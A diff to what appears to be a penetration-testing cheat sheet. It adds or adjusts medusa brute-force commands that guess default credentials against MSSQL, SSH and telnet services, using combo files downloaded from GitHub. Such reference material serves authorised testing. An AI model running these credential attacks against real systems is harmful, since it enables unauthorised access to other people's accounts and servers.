@@ -209,7 +209,7 @@ Check for empty passwords:
 Brute force attack (default creds):
 
     wget https://raw.githubusercontent.com/wintrmvte/medusa_combo_files/master/mssql_default_66.txt
-    medusa -M mssql -C mssql_default_66.txt -H mssqlServices.txt -T 4 -t 1
+    medusa -M mssql -C mssql_default_66.txt -H mssqlServices.txt -T 4 -t 1 -F
 
 Brute force attack (weak passwords):
 
@@ -553,7 +553,8 @@ TODO
 Brute forcing:
 
 ```
-TODO
+https://raw.githubusercontent.com/redcode-labs/medusa_combo_files/master/ssh_default_131.txt
+medusa -C ssh_default_131.txt -M ssh -H sshServices.txt -F -t 1 -T 8 -O medusa-ssh.out
 ```
 
 
@@ -593,6 +594,13 @@ telnet <ip>
 rexec <ip>
 rlogin <ip>
 rsh <ip>
+```
+
+Brute forcing (telnet):
+
+```
+wget https://raw.githubusercontent.com/redcode-labs/medusa_combo_files/master/telnet_default_706.txt
+medusa -C telnet_default_706.txt -M telnet -H legacyshellsServices.txt -t 2 -T 12 -O medusa-telnet.out
 ```
 
 Brute forcing:
